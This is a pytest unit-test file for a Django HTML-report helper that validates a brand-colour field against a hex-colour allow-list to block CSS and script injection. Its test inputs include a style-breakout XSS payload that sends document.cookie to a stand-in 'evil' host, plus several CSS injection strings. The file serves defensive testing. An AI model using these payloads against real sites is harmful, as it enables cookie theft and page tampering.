"""Unit tests for the HTML export's brand-colour validator.

``Workspace.brand_color`` is a free-text ``CharField(max_length=16)`` with no
validators, and the exported report interpolates it into a ``<style>`` block
(``:root{--accent:...}``). Every other value in that template goes through
``html.escape``; this one cannot — the CSS tokenizer does not decode HTML
entities, so escaping would neither neutralise a breakout nor keep a legitimate
colour intact. The defence is an allow-list of the shape of a hex colour, which
is what ``safe_accent_color`` implements and what these tests pin down.

Like ``test_report_cost.py``: ``apps.reports.views`` is a Django module and this
suite runs without Django and without a database, so the pure helper is lifted
out of the source with ``ast`` and executed on its own.
"""
from __future__ import annotations

import ast
import re
from pathlib import Path

import pytest

_VIEWS = Path(__file__).resolve().parents[1] / "apps" / "reports" / "views.py"

# Module-level names the helper closes over; lifted alongside it.
_REQUIRED_CONSTANTS = ("_DEFAULT_ACCENT", "_CSS_HEX_COLOR_RE")


def _load_safe_accent_color():
    """Compile just ``safe_accent_color`` (+ its constants) out of views.py."""
    tree = ast.parse(_VIEWS.read_text(), filename=str(_VIEWS))

    body = []
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(
            isinstance(t, ast.Name) and t.id in _REQUIRED_CONSTANTS for t in node.targets
        ):
            body.append(node)
        elif isinstance(node, ast.FunctionDef) and node.name == "safe_accent_color":
            body.append(node)

    assert any(isinstance(n, ast.FunctionDef) for n in body), (
        "safe_accent_color() was renamed or moved out of apps/reports/views.py"
    )
    namespace = {"re": re}
    exec(compile(ast.Module(body=body, type_ignores=[]), str(_VIEWS), "exec"), namespace)
    return namespace["safe_accent_color"], namespace["_DEFAULT_ACCENT"]


safe_accent_color, DEFAULT_ACCENT = _load_safe_accent_color()


# ── the attack this exists to stop ─────────────────────────────────────────
def test_style_breakout_payload_is_rejected():
    payload = "red}</style><script>fetch('//evil/'+document.cookie)</script>"
    assert safe_accent_color(payload) == DEFAULT_ACCENT


@pytest.mark.parametrize("payload", [
    "#fff}</style><script>alert(1)</script>",   # valid-looking prefix, then breakout
    "</style>",
    "red;background:url(//evil/)",
    "expression(alert(1))",
    "url(//evil/x.png)",
    "#3b82f6;--x:y",                            # extra declaration smuggled in
    "#3b82f6}",                                 # closes the :root rule
    "#3b82f6/*",                                # opens a comment, swallows the rest
    "\n}\n*{display:none}",                     # newlines are not a bypass
])
def test_css_injection_vectors_are_rejected(payload):
    assert safe_accent_color(payload) == DEFAULT_ACCENT


# ── legitimate values must survive untouched ───────────────────────────────
def test_ordinary_hex_colour_is_accepted():
    assert safe_accent_color("#3b82f6") == "#3b82f6"


@pytest.mark.parametrize("colour", [
    "#000", "#FFF", "#f0a",          # 3-digit
    "#0f0a",                         # 4-digit (with alpha)
    "#ef4444", "#EF4444", "#00ff00",  # 6-digit, either case
    "#3b82f6cc",                     # 8-digit (with alpha)
])
def test_hex_literal_shapes_are_accepted(colour):
    assert safe_accent_color(colour) == colour


def test_surrounding_whitespace_is_stripped_not_rejected():
    assert safe_accent_color("  #3b82f6\n") == "#3b82f6"


# ── degenerate input falls back rather than blowing up the export ──────────
@pytest.mark.parametrize("value", [None, "", "   ", 0, 0x3b82f6, [], {"color": "#fff"}])
def test_empty_and_non_string_values_fall_back(value):
    assert safe_accent_color(value) == DEFAULT_ACCENT


@pytest.mark.parametrize("value", [
    "3b82f6",        # missing '#'
    "#12345",        # 5 digits is not a CSS hex colour
    "#1234567",      # 7 digits either
    "#3b 82f6",      # internal whitespace is not stripped away
    "#zzzzzz",       # non-hex digits
    "rgb(1,2,3)",    # a valid CSS colour, but not what this field is for
    "blue",          # ditto: named colours are not accepted
])
def test_non_hex_values_fall_back(value):
    assert safe_accent_color(value) == DEFAULT_ACCENT


def test_default_is_overridable():
    assert safe_accent_color("nope", default="#123456") == "#123456"


def test_the_default_itself_is_a_valid_hex_colour():
    # Guards against the fallback ever becoming the injection vector.
    assert safe_accent_color(DEFAULT_ACCENT) == DEFAULT_ACCENT
